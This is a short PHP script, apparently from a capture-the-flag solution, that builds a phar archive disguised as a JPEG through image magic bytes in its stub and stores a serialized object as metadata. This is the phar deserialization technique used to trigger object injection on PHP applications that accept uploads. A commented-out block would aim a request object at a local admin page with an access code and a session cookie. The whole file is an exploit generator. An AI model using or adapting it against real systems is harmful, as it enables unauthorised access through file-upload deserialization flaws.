<?php
    $phar = new Phar('test.phar');
	$phar->startBuffering();
	$phar->addFromString('test.txt', 'text');
	$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");  // \xff\xd8\xff == jpg
	
	// $object = new Requests('http://127.0.0.1:80/admin.php',
	//                         array("access_code" => "windows"),
	//                         'PHPSESSID=0l5r6mmstlqir6e41al1l2eo5v'
	// );
	
	$phar->setMetadata($object);
	$phar->stopBuffering();
?>  